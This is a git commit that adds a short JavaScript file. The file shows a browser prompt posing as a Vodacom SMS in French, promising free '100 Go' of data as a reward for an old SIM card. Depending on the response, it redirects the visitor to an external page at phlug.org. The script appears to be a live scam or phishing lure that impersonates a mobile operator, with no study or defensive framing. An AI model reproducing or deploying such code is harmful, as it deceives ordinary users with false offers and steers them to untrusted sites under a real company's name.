add601404abe2dd5320f6deec403a69c576673c7
itidnewblog4 <ukpehaitid2@gmail.com>
2025-10-18 08:17:05 +0100

    Create active-vodacom.js

---
+++ active-vodacom.js
@@ -0,0 +1,5 @@
+var password = 'Activer 100 Go'
+password=prompt('SMS: Félicitations, votre carte SIM vodacom est éligible pour recevoir des données gratuites en récompense de votre ancienne carte SIM, cliquez sur OK pour activer','Activer 100 Go');
+if (password != 'Activer 100 Go') {
+location.href='https://phlug.org/vodacom.html';
+}
